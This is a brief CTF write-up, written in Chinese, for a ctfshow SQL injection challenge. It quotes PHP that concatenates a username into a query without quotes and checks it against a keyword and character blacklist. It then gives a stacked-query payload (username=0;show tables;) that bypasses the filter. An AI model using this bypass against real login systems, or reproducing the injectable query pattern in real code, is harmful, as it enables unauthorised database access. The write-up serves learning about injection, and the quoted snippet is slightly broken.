'''
 //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";

  if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(|\,/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }

'''

'''
把括号给过滤了，所以varchar(255)就不能用了，考虑改成其他的类型，但是不知道到底哪里出了问题
最简单的方法
username=0;show tables;    ;有没有都没关系
pass=ctfshow_user

所以当前查询为
$sql = "select pass from ctfshow_user where username = {0;show tables;};";
'''
